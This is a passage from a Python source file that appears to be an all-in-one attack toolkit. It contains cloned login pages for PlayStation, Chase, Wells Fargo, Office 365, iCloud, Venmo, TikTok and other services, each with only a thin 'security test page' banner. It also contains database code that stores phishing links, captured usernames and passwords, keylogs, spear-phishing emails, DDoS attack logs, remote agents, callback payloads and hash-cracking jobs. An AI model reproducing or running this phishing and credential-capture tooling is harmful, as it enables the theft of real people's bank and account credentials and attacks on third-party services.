.login-box{background:white;border-radius:8px;padding:40px;width:400px;box-shadow:0 2px 10px rgba(0,0,0,0.2)}
.logo{color:#003791;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
input:focus{outline:none;border-color:#003791}
button{width:100%;padding:12px;background:#003791;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">PlayStation</div>
<form method="POST"><input type="text" name="email" placeholder="Email address" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _get_cashapp_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Cash App</title>
<style>
body{background:#00d632;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:8px;padding:40px;width:400px;box-shadow:0 2px 10px rgba(0,0,0,0.2)}
.logo{color:#00d632;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
input:focus{outline:none;border-color:#00d632}
button{width:100%;padding:12px;background:#00d632;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Cash App</div>
<form method="POST"><input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _get_venmo_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Venmo</title>
<style>
body{background:#008cff;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:8px;padding:40px;width:400px;box-shadow:0 2px 10px rgba(0,0,0,0.2)}
.logo{color:#008cff;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
input:focus{outline:none;border-color:#008cff}
button{width:100%;padding:12px;background:#008cff;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Venmo</div>
<form method="POST"><input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _get_chase_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Chase</title>
<style>
body{background:#1174c2;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:8px;padding:40px;width:400px;box-shadow:0 2px 10px rgba(0,0,0,0.2)}
.logo{color:#1174c2;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
input:focus{outline:none;border-color:#1174c2}
button{width:100%;padding:12px;background:#1174c2;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Chase</div>
<form method="POST"><input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _get_wellsfargo_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Wells Fargo</title>
<style>
body{background:#bc1f2c;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:8px;padding:40px;width:400px;box-shadow:0 2px 10px rgba(0,0,0,0.2)}
.logo{color:#bc1f2c;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
input:focus{outline:none;border-color:#bc1f2c}
button{width:100%;padding:12px;background:#bc1f2c;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Wells Fargo</div>
<form method="POST"><input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _get_office365_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Office 365</title>
<style>
body{background:#f2f2f2;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:4px;padding:44px;width:440px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
.logo{color:#0078d4;font-size:28px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ccc;border-radius:2px;box-sizing:border-box}
input:focus{outline:none;border-color:#0078d4}
button{width:100%;padding:12px;background:#0078d4;color:white;border:none;border-radius:2px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Office 365</div>
<form method="POST"><input type="text" name="email" placeholder="Email, phone, or Skype" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _get_onedrive_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>OneDrive</title>
<style>
body{background:#f2f2f2;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:4px;padding:44px;width:440px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
.logo{color:#0078d4;font-size:28px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ccc;border-radius:2px;box-sizing:border-box}
input:focus{outline:none;border-color:#0078d4}
button{width:100%;padding:12px;background:#0078d4;color:white;border:none;border-radius:2px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">OneDrive</div>
<form method="POST"><input type="text" name="email" placeholder="Email address" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _get_icloud_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>iCloud</title>
<style>
body{background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:12px;padding:40px;width:420px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
.logo{color:#0071e3;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #d6d6d6;border-radius:8px;box-sizing:border-box}
input:focus{outline:none;border-color:#0071e3}
button{width:100%;padding:12px;background:#0071e3;color:white;border:none;border-radius:8px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">iCloud</div>
<form method="POST"><input type="text" name="email" placeholder="Apple ID" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _get_pinterest_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Pinterest</title>
<style>
body{background:#e60023;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:8px;padding:40px;width:400px;box-shadow:0 2px 10px rgba(0,0,0,0.2)}
.logo{color:#e60023;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
input:focus{outline:none;border-color:#e60023}
button{width:100%;padding:12px;background:#e60023;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Pinterest</div>
<form method="POST"><input type="text" name="email" placeholder="Email address" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _get_reddit_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Reddit</title>
<style>
body{background:#ff4500;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:8px;padding:40px;width:400px;box-shadow:0 2px 10px rgba(0,0,0,0.2)}
.logo{color:#ff4500;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
input:focus{outline:none;border-color:#ff4500}
button{width:100%;padding:12px;background:#ff4500;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Reddit</div>
<form method="POST"><input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _get_snapchat_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Snapchat</title>
<style>
body{background:#fffc00;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:8px;padding:40px;width:400px;box-shadow:0 2px 10px rgba(0,0,0,0.2)}
.logo{color:#fffc00;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold;text-shadow:0 0 2px #000}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
input:focus{outline:none;border-color:#fffc00}
button{width:100%;padding:12px;background:#fffc00;color:#000;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Snapchat</div>
<form method="POST"><input type="text" name="username" placeholder="Username or Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _get_tiktok_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>TikTok</title>
<style>
body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;color:#fff}
.login-box{background:#111;border-radius:8px;padding:40px;width:400px}
.logo{color:#fe2c55;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;background:#222;border:1px solid #333;border-radius:4px;color:#fff;box-sizing:border-box}
input:focus{outline:none;border-color:#fe2c55}
button{width:100%;padding:12px;background:#fe2c55;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#1a1a1a;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">TikTok</div>
<form method="POST"><input type="text" name="username" placeholder="Username or email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _get_tinder_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Tinder</title>
<style>
body{background:#fd5068;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:8px;padding:40px;width:400px;box-shadow:0 2px 10px rgba(0,0,0,0.2)}
.logo{color:#fd5068;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
input:focus{outline:none;border-color:#fd5068}
button{width:100%;padding:12px;background:#fd5068;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Tinder</div>
<form method="POST"><input type="text" name="email" placeholder="Email address" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _get_bumble_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Bumble</title>
<style>
body{background:#ff6b6b;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:8px;padding:40px;width:400px;box-shadow:0 2px 10px rgba(0,0,0,0.2)}
.logo{color:#ff6b6b;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
input:focus{outline:none;border-color:#ff6b6b}
button{width:100%;padding:12px;background:#ff6b6b;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Bumble</div>
<form method="POST"><input type="text" name="email" placeholder="Email address" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _get_custom_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Secure Login</title>
<style>
body{font-family:Arial;background:linear-gradient(135deg,#0a0e1a,#16213e,#0f3460);display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:16px;padding:40px;width:400px;box-shadow:0 20px 60px rgba(0,0,0,0.5)}
.logo{text-align:center;margin-bottom:30px}
.logo h1{color:#1a1a2e;font-size:28px}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:8px;box-sizing:border-box}
input:focus{outline:none;border-color:#0f3460}
button{width:100%;padding:14px;background:linear-gradient(135deg,#1a1a2e,#0f3460);color:white;border:none;border-radius:8px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#f8d7da;border-radius:8px;color:#721c24;text-align:center;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo"><h1>CYCLOPUS Secure Portal</h1></div>
<form method="POST"><input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Login</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''

    # ==================== Database Methods ====================
    def log_command(self, command: str, source: str = "local", platform: str = None,
                   user_id: str = None, success: bool = True, output: str = "",
                   execution_time: float = 0.0):
        try:
            self.conn.execute(
                """INSERT INTO command_history 
                   (command, source, platform, user_id, success, output, execution_time)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (command, source, platform, user_id, success, output[:5000], execution_time)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log command: {e}")
    
    def log_threat(self, threat_type: str, source_ip: str, severity: str, description: str):
        try:
            self.conn.execute(
                "INSERT INTO threats (threat_type, source_ip, severity, description) VALUES (?, ?, ?, ?)",
                (threat_type, source_ip, severity, description)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log threat: {e}")
    
    def add_managed_ip(self, ip: str, domain: str = None, hostname: str = None,
                      os_info: str = None, added_by: str = "system", notes: str = "") -> bool:
        try:
            ipaddress.ip_address(ip)
            self.conn.execute(
                """INSERT OR IGNORE INTO managed_ips 
                   (ip_address, domain, hostname, os_info, added_by, notes, threat_level)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (ip, domain, hostname, os_info, added_by, notes, 'low')
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def block_ip(self, ip: str, reason: str, executed_by: str = "system") -> bool:
        try:
            self.conn.execute(
                "UPDATE managed_ips SET is_blocked = 1, block_reason = ? WHERE ip_address = ?",
                (reason, ip)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def unblock_ip(self, ip: str) -> bool:
        try:
            self.conn.execute(
                "UPDATE managed_ips SET is_blocked = 0, block_reason = NULL WHERE ip_address = ?",
                (ip,)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def get_managed_ips(self, include_blocked: bool = True) -> List[Dict]:
        try:
            if include_blocked:
                rows = self.conn.execute("SELECT * FROM managed_ips ORDER BY added_date DESC")
            else:
                rows = self.conn.execute("SELECT * FROM managed_ips WHERE is_blocked = 0 ORDER BY added_date DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def update_ip_scan(self, ip: str, open_ports: List[int], closed_ports: List[int], 
                      threat_level: str, hostname: str = None, os_info: str = None):
        try:
            self.conn.execute(
                """UPDATE managed_ips 
                   SET open_ports = ?, closed_ports = ?, threat_level = ?, 
                       last_scan = CURRENT_TIMESTAMP, hostname = ?, os_info = ?
                   WHERE ip_address = ?""",
                (json.dumps(open_ports), json.dumps(closed_ports), threat_level, hostname, os_info, ip)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to update IP scan: {e}")
    
    def get_ip_info(self, ip: str) -> Optional[Dict]:
        try:
            row = self.conn.execute("SELECT * FROM managed_ips WHERE ip_address = ?", (ip,)).fetchone()
            if row:
                return dict(row)
            return None
        except:
            return None
    
    def add_ssh_connection(self, conn: SSHConnection) -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO ssh_connections 
                   (id, name, host, port, username, password_encrypted, key_path, status, created_at)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (conn.id, conn.name, conn.host, conn.port, conn.username,
                 conn.password, conn.key_path, conn.status, conn.created_at)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to add SSH connection: {e}")
            return False
    
    def get_ssh_connections(self) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM ssh_connections ORDER BY name")
            return [dict(row) for row in rows]
        except:
            return []
    
    def log_ssh_command(self, connection_id: str, command: str, output: str,
                       exit_code: int, execution_time: float):
        try:
            self.conn.execute(
                """INSERT INTO ssh_commands 
                   (connection_id, command, output, exit_code, execution_time)
                   VALUES (?, ?, ?, ?, ?)""",
                (connection_id, command, output[:5000], exit_code, execution_time)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log SSH command: {e}")
    
    def log_traffic(self, generator: TrafficGenerator, executed_by: str = "system"):
        try:
            self.conn.execute(
                """INSERT INTO traffic_logs 
                   (traffic_type, target_ip, target_port, duration, packets_sent, bytes_sent, status, executed_by)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
                (generator.traffic_type, generator.target_ip, generator.target_port,
                 generator.duration, generator.packets_sent, generator.bytes_sent,
                 generator.status, executed_by)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log traffic: {e}")
    
    def log_nikto_scan(self, target: str, vulnerabilities: List[Dict], output_file: str,
                      scan_time: float, success: bool):
        try:
            self.conn.execute(
                """INSERT INTO nikto_scans (target, vulnerabilities, output_file, scan_time, success)
                   VALUES (?, ?, ?, ?, ?)""",
                (target, json.dumps(vulnerabilities), output_file, scan_time, success)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log Nikto scan: {e}")
    
    def save_phishing_link(self, link: PhishingLink) -> bool:
        try:
            self.conn.execute(
                """INSERT INTO phishing_links (id, platform, phishing_url, template, created_at, clicks)
                   VALUES (?, ?, ?, ?, ?, ?)""",
                (link.id, link.platform, link.phishing_url, link.template, link.created_at, link.clicks)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def get_phishing_links(self, active_only: bool = True) -> List[Dict]:
        try:
            if active_only:
                rows = self.conn.execute("SELECT * FROM phishing_links WHERE active = 1 ORDER BY created_at DESC")
            else:
                rows = self.conn.execute("SELECT * FROM phishing_links ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_captured_credential(self, link_id: str, username: str, password: str,
                                 ip_address: str, user_agent: str):
        try:
            self.conn.execute(
                """INSERT INTO captured_credentials (phishing_link_id, username, password, ip_address, user_agent)
                   VALUES (?, ?, ?, ?, ?)""",
                (link_id, username, password, ip_address, user_agent)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save credential: {e}")
    
    def get_captured_credentials(self, link_id: str = None) -> List[Dict]:
        try:
            if link_id:
                rows = self.conn.execute(
                    "SELECT * FROM captured_credentials WHERE phishing_link_id = ? ORDER BY timestamp DESC",
                    (link_id,)
                )
            else:
                rows = self.conn.execute("SELECT * FROM captured_credentials ORDER BY timestamp DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def get_recent_threats(self, limit: int = 10) -> List[Dict]:
        try:
            rows = self.conn.execute(
                "SELECT * FROM threats ORDER BY timestamp DESC LIMIT ?", (limit,)
            )
            return [dict(row) for row in rows]
        except:
            return []
    
    def get_statistics(self) -> Dict:
        stats = {}
        try:
            stats['total_commands'] = self.conn.execute("SELECT COUNT(*) FROM command_history").fetchone()[0]
            stats['total_threats'] = self.conn.execute("SELECT COUNT(*) FROM threats").fetchone()[0]
            stats['total_managed_ips'] = self.conn.execute("SELECT COUNT(*) FROM managed_ips").fetchone()[0]
            stats['blocked_ips'] = self.conn.execute("SELECT COUNT(*) FROM managed_ips WHERE is_blocked = 1").fetchone()[0]
            stats['total_ssh_connections'] = self.conn.execute("SELECT COUNT(*) FROM ssh_connections").fetchone()[0]
            stats['total_traffic_tests'] = self.conn.execute("SELECT COUNT(*) FROM traffic_logs").fetchone()[0]
            stats['total_phishing_links'] = self.conn.execute("SELECT COUNT(*) FROM phishing_links").fetchone()[0]
            stats['captured_credentials'] = self.conn.execute("SELECT COUNT(*) FROM captured_credentials").fetchone()[0]
            stats['total_keylogs'] = self.conn.execute("SELECT COUNT(*) FROM keylogs").fetchone()[0]
            stats['total_ddos_attacks'] = self.conn.execute("SELECT COUNT(*) FROM ddos_attacks").fetchone()[0]
            stats['total_cracking_jobs'] = self.conn.execute("SELECT COUNT(*) FROM cracking_jobs").fetchone()[0]
            stats['total_arp_spoofs'] = self.conn.execute("SELECT COUNT(*) FROM arp_spoofing").fetchone()[0]
            stats['total_mac_entries'] = self.conn.execute("SELECT COUNT(*) FROM mac_info").fetchone()[0]
            stats['total_nat_entries'] = self.conn.execute("SELECT COUNT(*) FROM nat_info").fetchone()[0]
            stats['total_emails'] = self.conn.execute("SELECT COUNT(*) FROM email_messages").fetchone()[0]
            stats['total_pdf_reports'] = self.conn.execute("SELECT COUNT(*) FROM pdf_reports").fetchone()[0]
            stats['total_payloads'] = self.conn.execute("SELECT COUNT(*) FROM payloads").fetchone()[0]
            stats['total_agents'] = self.conn.execute("SELECT COUNT(*) FROM agents").fetchone()[0]
            stats['total_domain_hosts'] = self.conn.execute("SELECT COUNT(*) FROM domain_hosting").fetchone()[0]
        except:
            pass
        return stats
    
    def verify_user(self, username: str, password: str) -> Optional[Dict]:
        try:
            import hashlib
            password_hash = hashlib.sha256(password.encode()).hexdigest()
            row = self.conn.execute(
                "SELECT * FROM users WHERE username = ? AND password_hash = ?",
                (username, password_hash)
            ).fetchone()
            return dict(row) if row else None
        except:
            return None
    
    def create_session(self, user_id: int) -> str:
        try:
            session_id = secrets.token_urlsafe(32)
            expires_at = datetime.datetime.now() + datetime.timedelta(hours=24)
            self.conn.execute(
                "INSERT INTO sessions (id, user_id, expires_at) VALUES (?, ?, ?)",
                (session_id, user_id, expires_at.isoformat())
            )
            self.conn.commit()
            return session_id
        except:
            return None
    
    def verify_session(self, session_id: str) -> Optional[Dict]:
        try:
            row = self.conn.execute(
                """SELECT s.*, u.username, u.role 
                   FROM sessions s 
                   JOIN users u ON s.user_id = u.id 
                   WHERE s.id = ? AND s.expires_at > datetime('now')""",
                (session_id,)
            ).fetchone()
            return dict(row) if row else None
        except:
            return None
    
    def log_keylog(self, text: str, session_id: str = None, app_name: str = None,
                  hostname: str = None, screenshot_path: str = None):
        try:
            self.conn.execute(
                """INSERT INTO keylogs (text, session_id, app_name, hostname, screenshot_path)
                   VALUES (?, ?, ?, ?, ?)""",
                (text[:1000], session_id, app_name, hostname, screenshot_path)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log keylog: {e}")
    
    def get_keylogs(self, limit: int = 100, session_id: str = None) -> List[Dict]:
        try:
            if session_id:
                rows = self.conn.execute(
                    "SELECT * FROM keylogs WHERE session_id = ? ORDER BY timestamp DESC LIMIT ?",
                    (session_id, limit)
                )
            else:
                rows = self.conn.execute("SELECT * FROM keylogs ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_spear_phishing(self, email_data: Dict) -> bool:
        try:
            self.conn.execute(
                """INSERT INTO spear_phishing 
                   (id, target_email, subject, body, template, sent_at, status, opened, clicked, tracking_id)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (email_data['id'], email_data['target_email'], email_data['subject'],
                 email_data['body'], email_data.get('template', ''), email_data['sent_at'],
                 email_data.get('status', 'sent'), email_data.get('opened', 0),
                 email_data.get('clicked', 0), email_data['id'])
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save spear phishing: {e}")
            return False
    
    def get_spear_phishing(self) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM spear_phishing ORDER BY sent_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def log_ddos_attack(self, target_ip: str, attack_type: str, port: int, duration: int,
                       threads: int, packets_sent: int, status: str, executed_by: str = "system"):
        try:
            self.conn.execute(
                """INSERT INTO ddos_attacks 
                   (target_ip, attack_type, port, duration, threads, packets_sent, status, executed_by)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
                (target_ip, attack_type, port, duration, threads, packets_sent, status, executed_by)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log DDoS attack: {e}")
    
    def register_agent(self, agent_id: str, name: str, hostname: str, ip: str, os_info: str) -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO agents (id, name, hostname, ip_address, os_info, last_seen, status)
                   VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP, 'online')""",
                (agent_id, name, hostname, ip, os_info)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def update_agent_heartbeat(self, agent_id: str):
        try:
            self.conn.execute(
                "UPDATE agents SET last_seen = CURRENT_TIMESTAMP, status = 'online' WHERE id = ?",
                (agent_id,)
            )
            self.conn.commit()
        except:
            pass
    
    def get_agents(self) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM agents ORDER BY last_seen DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_payload(self, payload: Payload) -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO payloads 
                   (id, name, payload_type, file_path, created_at, deployed, deployment_count, callback_host, callback_port)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (payload.id, payload.name, payload.payload_type, payload.file_path,
                 payload.created_at, payload.deployed, payload.deployment_count,
                 payload.callback_host, payload.callback_port)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save payload: {e}")
            return False
    
    def get_payloads(self, payload_type: str = None) -> List[Dict]:
        try:
            if payload_type:
                rows = self.conn.execute("SELECT * FROM payloads WHERE payload_type = ? ORDER BY created_at DESC", (payload_type,))
            else:
                rows = self.conn.execute("SELECT * FROM payloads ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_network_packet(self, source_ip: str, dest_ip: str, source_port: int,
                           dest_port: int, protocol: str, size: int, payload: str = ""):
        try:
            self.conn.execute(
                """INSERT INTO network_packets 
                   (source_ip, dest_ip, source_port, dest_port, protocol, size, payload)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (source_ip, dest_ip, source_port, dest_port, protocol, size, payload[:1000])
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save network packet: {e}")
    
    def get_network_packets(self, limit: int = 100) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM network_packets ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_cracking_job(self, job_id: str, hash_type: str, hash_value: str, wordlist: str) -> bool:
        try:
            self.conn.execute(
                """INSERT INTO cracking_jobs (job_id, hash_type, hash_value, wordlist, status)
                   VALUES (?, ?, ?, ?, 'pending')""",
                (job_id, hash_type, hash_value, wordlist)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save cracking job: {e}")
            return False
    
    def update_cracking_job(self, job_id: str, status: str, result: str = None, cracked: bool = False):
        try:
            self.conn.execute(
                """UPDATE cracking_jobs 
                   SET status = ?, result = ?, cracked = ?, completed_at = CURRENT_TIMESTAMP 
                   WHERE job_id = ?""",
